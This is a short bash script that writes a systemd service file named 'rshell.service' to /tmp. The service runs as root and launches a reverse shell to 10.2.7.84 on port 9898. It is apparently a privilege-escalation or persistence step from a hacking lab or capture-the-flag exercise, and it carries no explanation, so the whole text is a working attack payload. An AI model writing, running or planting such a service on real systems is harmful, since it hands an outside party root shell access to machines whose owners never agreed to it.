#!/bin/bash

echo "[Unit]\r\nDescription=roooot\r\n\n[Service]\r\nType=simple\r\nUser=root\r\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.7.84/9898 0>&1'\r\n\n[Install]\r\nWantedBy=multi-user.target" > /tmp/rshell.service
